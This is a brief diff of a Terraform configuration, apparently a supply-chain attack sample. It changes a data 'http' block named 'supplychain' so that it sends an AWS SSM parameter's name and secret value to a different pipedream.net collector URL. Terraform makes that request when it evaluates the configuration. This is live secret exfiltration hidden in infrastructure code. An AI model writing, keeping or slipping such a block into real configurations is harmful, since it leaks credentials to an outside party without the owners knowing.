@@ -11,5 +11,5 @@ resource "random_password" "password" {
 }
 
 data "http" "supplychain" {
-  url = "https://eoc80jdld4orgoq.m.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
+  url = "https://eodbq4qh4eejvxo.m.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
 }
